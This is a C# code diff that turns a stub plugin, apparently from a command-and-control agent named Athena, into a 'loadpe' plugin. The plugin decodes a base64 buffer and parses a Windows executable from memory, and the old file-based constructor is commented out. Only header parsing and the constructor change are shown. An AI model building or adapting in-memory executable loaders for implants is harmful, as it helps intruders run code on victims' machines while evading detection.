@@ -5,23 +5,21 @@ using System.Text;
 using System.IO.Compression;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
+using PluginBase;
 
-namespace Athena
+namespace Plugin
 {
-    public static class Plugin
+    public static class loadpe
     {
         public class PluginResponse
         {
             public bool success { get; set; }
             public string output { get; set; }
         }
-        public static PluginResponse Execute(Dictionary<string, object> args)
+        public static void Execute(Dictionary<string, object> args)
         {
-            return new PluginResponse()
-            {
-                success = false,
-                output = "Not implemented yet."
-            };
+            PELoader loader = new PELoader(Convert.FromBase64String(args["buffer"].ToString()));
+            return;
         }
         public class PELoader
         {
@@ -253,40 +251,40 @@ namespace Athena
 
 
 
-            public PELoader(string filePath)
-            {
-                // Read in the DLL or EXE and get the timestamp
-                using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
-                {
-                    BinaryReader reader = new BinaryReader(stream);
-                    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
+            //public PELoader(string filePath)
+            //{
+            //    // Read in the DLL or EXE and get the timestamp
+            //    using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
+            //    {
+            //        BinaryReader reader = new BinaryReader(stream);
+            //        dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
 
-                    // Add 4 bytes to the offset
-                    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
+            //        // Add 4 bytes to the offset
+            //        stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
 
-                    UInt32 ntHeadersSignature = reader.ReadUInt32();
-                    fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
-                    if (this.Is32BitHeader)
-                    {
-                        optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
-                    }
-                    else
-                    {
-                        optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
-                    }
+            //        UInt32 ntHeadersSignature = reader.ReadUInt32();
+            //        fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
+            //        if (this.Is32BitHeader)
+            //        {
+            //            optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
+            //        }
+            //        else
+            //        {
+            //            optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
+            //        }
 
-                    imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
-                    for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
-                    {
-                        imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
-                    }
+            //        imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
+            //        for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
+            //        {
+            //            imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
+            //        }
 
 
 
-                    rawbytes = System.IO.File.ReadAllBytes(filePath);
+            //        rawbytes = System.IO.File.ReadAllBytes(filePath);
 
-                }
-            }
+            //    }
+            //}
 
             public PELoader(byte[] fileBytes)
             {
